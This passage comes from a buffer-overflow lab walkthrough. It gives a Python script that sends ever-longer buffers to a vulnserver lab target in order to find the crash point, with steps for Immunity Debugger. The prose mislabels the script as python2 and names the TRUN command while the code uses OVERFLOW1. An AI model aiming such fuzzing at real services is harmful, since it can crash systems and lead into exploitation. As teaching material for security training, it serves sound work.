
Fuzzing is just like spiking, but now that we know that this server is vulnerable to `TRUN` and not `STATS` we will use this python2 script for it :

```python
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.239.130"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

The purpose of this script is so far there is connection to our target which is specified with the `ip` and `port` , it will keep sending buffer, we are trying to narrow down where things are breaking and it byte size

- Save your script with `.py` and make sure you have immunity debugger and vulnserver ready
- Also make sure you click the `run` button first on immunity debugger before moving on

![](https://i.imgur.com/80EQ0QI.png)

- Now run your script and notice what is going on

![](https://i.imgur.com/a4kuXNN.png)
